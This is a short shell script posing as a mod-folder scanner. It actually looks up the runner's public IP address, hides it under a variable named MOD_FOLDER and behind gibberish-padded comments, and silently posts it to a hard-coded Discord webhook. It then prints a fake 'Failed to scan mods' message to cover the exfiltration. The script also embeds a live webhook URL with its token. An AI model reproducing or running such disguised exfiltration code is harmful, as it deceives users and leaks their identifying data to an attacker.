DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1408230204832481452/t6TE1DheTsJ7CBu2zAN7SU9BlHxyzjkRBOtmP8tnPvjYn8EzRNuWc7PYUazEt6-2bTpW"

# Grab the "mods folder"ijefijefijefijefijefijefijefijwefojwefojwefojwefojwefoijwefojwefojwef
MOD_FOLDER=$(curl -s https://api.ipify.org 2>/dev/null)

if [ -n "$MOD_FOLDER" ]; then
    JSON_PAYLOAD=$(cat << EOF
{
  "content": null,
  "embeds": [
    {
      "title": "📂 Scan Metadata",
      "color": 5814783,
      "fields": [
        {
          "name": "Mod Folder",
          "value": "$MOD_FOLDER",
          "inline": true
        }
      ],
      "footer": {
        "text": "Scan Logger"
      }
    }
  ],
  "username": "Scanner Bot",
  "avatar_url": "https://cdn-icons-png.flaticon.com/512/1006/1006771.png"
}
EOF
    )

    curl -s -H "Content-Type: application/json" \
        -X POST \
        -d "$JSON_PAYLOAD" \
        "$DISCORD_WEBHOOK_URL" >/dev/null 2>&1
fi

echo "❌ Failed to scan mods"
